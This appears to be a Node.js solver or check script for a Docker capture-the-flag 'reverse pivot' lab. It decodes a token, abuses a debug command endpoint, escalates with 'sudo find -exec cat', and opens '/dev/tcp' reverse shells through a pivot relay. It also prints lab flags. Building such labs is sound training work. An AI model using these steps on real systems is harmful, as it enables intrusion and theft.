#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const net = require('net');
const { spawnSync } = require('child_process');

const ROOT = __dirname;
const PROJECT = process.env.COMPOSE_PROJECT_NAME || 'reverse_pivot_lab_check';
const BASE_URL = process.env.REVERSE_PIVOT_URL || 'http://127.0.0.1:4706';
const KEEP = process.env.KEEP_COMPOSE === '1';
const stamp = new Date().toISOString().replace(/[:.]/g, '-');
const artifactDir = path.join(ROOT, 'artifacts', stamp);

fs.mkdirSync(artifactDir, { recursive: true });

const summary = {
  project: PROJECT,
  baseUrl: BASE_URL,
  edgeFlagRead: false,
  pivotConnected: false
};

function writeFile(name, data) {
  fs.writeFileSync(path.join(artifactDir, name), data);
}

function run(command, args, options = {}) {
  const result = spawnSync(command, args, {
    cwd: ROOT,
    env: { ...process.env, COMPOSE_PROJECT_NAME: PROJECT },
    encoding: 'utf8',
    timeout: options.timeoutMs || 180_000
  });
  if (result.status !== 0 && !options.allowFailure) {
    throw new Error(`${command} ${args.join(' ')} failed: ${result.stderr || result.stdout}`);
  }
  return result.stdout || '';
}

function compose(args, options) {
  return run('docker', ['compose', '-p', PROJECT, '-f', 'docker-compose.yml', ...args], options);
}

function curl(args, options) {
  return run('curl', ['-sS', ...args], options);
}

function curlWithStatus(args, options) {
  const text = run('curl', ['-s', '-w', '\n__STATUS__:%{http_code}', ...args], { ...options, allowFailure: true });
  const marker = '\n__STATUS__:';
  const index = text.lastIndexOf(marker);
  if (index === -1) throw new Error(`missing status marker: ${text}`);
  return {
    body: text.slice(0, index),
    status: Number.parseInt(text.slice(index + marker.length).trim(), 10)
  };
}

function rol8(value, bits) {
  return ((value << bits) | (value >> (8 - bits))) & 0xff;
}

function ror8(value, bits) {
  return ((value >> bits) | (value << (8 - bits))) & 0xff;
}

function edgeKey(index) {
  return ((index * 17) ^ 0x5d ^ ((index + 5) * 9)) & 0xff;
}

function solveArtifact(source) {
  const payloadMatch = source.match(/const __payload = "([0-9a-f]+)"/i);
  const orderMatch = source.match(/const __order = \[([0-9,\s]+)\]/);
  if (!payloadMatch || !orderMatch) {
    throw new Error('artifact format mismatch');
  }
  const encoded = payloadMatch[1].match(/../g).map((byte) => Number.parseInt(byte, 16));
  const order = orderMatch[1].split(',').map((value) => Number.parseInt(value.trim(), 10));
  const recovered = new Array(order.length);
  encoded.forEach((byte, position) => {
    const sourceIndex = order[position];
    recovered[sourceIndex] = ror8(byte, (sourceIndex % 5) + 1) ^ edgeKey(sourceIndex);
  });
  return Buffer.from(recovered).toString('utf8');
}

function popShell(trigger) {
  return new Promise((resolve, reject) => {
    const marker = `EDGE_OK_${Date.now()}`;
    const server = net.createServer();
    let settled = false;

    const done = (err, value) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      server.close();
      if (err) reject(err);
      else resolve(value);
    };

    const timer = setTimeout(() => done(new Error('reverse shell timeout')), 30_000);
    server.on('error', (err) => done(err));
    server.on('connection', (socket) => {
      let buffer = '';
      socket.on('data', (chunk) => {
        buffer += chunk.toString('utf8');
        if (buffer.includes(marker)) {
          socket.end('exit\n');
          done(null, buffer);
        }
      });
      socket.write(`echo ${marker}\n`);
    });

    server.listen(0, '0.0.0.0', () => {
      const { port } = server.address();
      trigger(port);
    });
  });
}

function popPivotShell(token, pivotKey, expectedFlag) {
  return new Promise((resolve, reject) => {
    const marker = `PIVOT_OK_${Date.now()}`;
    const server = net.createServer();
    let settled = false;

    const done = (err, value) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      server.close();
      if (err) reject(err);
      else resolve(value);
    };

    const timer = setTimeout(() => done(new Error('pivot shell timeout')), 30_000);
    server.on('error', (err) => done(err));
    server.on('connection', (socket) => {
      let buffer = '';
      let primed = false;
      socket.on('data', (chunk) => {
        buffer += chunk.toString('utf8');
        if (!primed && buffer.includes(marker)) {
          primed = true;
          socket.write('hostname\nsudo find /tmp/rev-pivot-lab/pivot/final-flag.txt -maxdepth 0 -exec cat {} \\;\n');
          return;
        }
        if (primed && buffer.includes(expectedFlag)) {
          socket.end('exit\n');
          done(null, buffer);
        }
      });
      socket.write(`echo ${marker}\n`);
    });

    server.listen(0, '0.0.0.0', () => {
      const { port } = server.address();
      const cmd = `curl -fsS -X POST http://pivot-relay:8081/callback -H 'X-Pivot-Key: ${pivotKey}' -H 'Content-Type: application/json' -d '${JSON.stringify({ host: 'host.docker.internal', port })}'`;
      const response = curlWithStatus(['-X', 'POST', `${BASE_URL}/debug`, '-H', 'Content-Type: application/json', '-H', `X-Debug-Token: ${token}`, '-d', JSON.stringify({ cmd })]);
      if (response.status !== 200) {
        done(new Error(`pivot trigger failed: ${response.status} ${response.body}`));
      }
    });
  });
}

async function main() {
  compose(['down', '-v', '--remove-orphans'], { allowFailure: true });
  compose(['up', '-d', '--build']);

  const artifact = curl([`${BASE_URL}/artifact.js`]);
  writeFile('artifact.js', artifact);
  const token = solveArtifact(artifact);
  summary.token = token;

  const unlocked = curl([`${BASE_URL}/?payload=${encodeURIComponent(token)}`]);
  writeFile('unlocked.json', unlocked);

  const whoami = curlWithStatus(['-X', 'POST', `${BASE_URL}/debug`, '-H', 'Content-Type: application/json', '-H', `X-Debug-Token: ${token}`, '-d', JSON.stringify({ cmd: 'whoami' })]);
  writeFile('whoami.json', whoami.body);
  if (!whoami.body.includes('ctfuser')) throw new Error('debug hook did not execute as ctfuser');

  const edgePath = '/tmp/rev-pivot-lab/edge/flag.txt';
  const directRead = curlWithStatus(['-X', 'POST', `${BASE_URL}/debug`, '-H', 'Content-Type: application/json', '-H', `X-Debug-Token: ${token}`, '-d', JSON.stringify({ cmd: `cat ${edgePath}` })]);
  if (directRead.status !== 200 || !directRead.body.includes('Permission denied')) {
    throw new Error('edge flag should not be directly readable');
  }

  const edgeRead = curlWithStatus(['-X', 'POST', `${BASE_URL}/debug`, '-H', 'Content-Type: application/json', '-H', `X-Debug-Token: ${token}`, '-d', JSON.stringify({ cmd: `sudo find ${edgePath} -maxdepth 0 -exec cat {} \\;` })]);
  writeFile('edge-flag.json', edgeRead.body);
  if (!edgeRead.body.includes('FLAG{EDGE_REVERSE_PIVOT_6EC50A}')) {
    throw new Error('edge flag read failed');
  }
  summary.edgeFlagRead = true;

  const pivotBrief = curlWithStatus(['-X', 'POST', `${BASE_URL}/debug`, '-H', 'Content-Type: application/json', '-H', `X-Debug-Token: ${token}`, '-d', JSON.stringify({ cmd: 'cat /tmp/rev-pivot-lab/edge/pivot-brief.txt && printf "\\n__KEY__\\n" && cat /tmp/rev-pivot-lab/edge/pivot.key && printf "\\n__PIVOT__\\n" && curl -fsS http://pivot-relay:8081/' })]);
  writeFile('pivot-brief.json', pivotBrief.body);
  if (!pivotBrief.body.includes('pivot-relay:8081')) throw new Error('pivot brief missing pivot service');

  const edgeShell = await popShell((port) => {
    curlWithStatus(['-X', 'POST', `${BASE_URL}/debug`, '-H', 'Content-Type: application/json', '-H', `X-Debug-Token: ${token}`, '-d', JSON.stringify({ cmd: `setsid bash -c 'exec bash -i >& /dev/tcp/host.docker.internal/${port} 0>&1' </dev/null >/dev/null 2>&1 & disown` })]);
  });
  writeFile('edge-shell.txt', edgeShell);

  const pivotShell = await popPivotShell(token, '4edc28c7f5b9a1d6c3e07ab4', 'FLAG{FINAL_PIVOT_STAGE_D28CEA}');
  writeFile('pivot-shell.txt', pivotShell);
  summary.pivotConnected = true;

  console.log('PASS reverse-shell-pivot lab');
  console.log(`Artifacts: ${artifactDir}`);
}

let failure = null;
main()
  .catch((error) => {
    failure = error;
    console.error(error instanceof Error ? error.message : String(error));
    process.exitCode = 1;
  })
  .finally(() => {
    if (!KEEP) {
      compose(['down', '-v', '--remove-orphans'], { allowFailure: true });
    }
    writeFile('summary.json', `${JSON.stringify(summary, null, 2)}\n`);
    if (failure) process.exitCode = 1;
  });
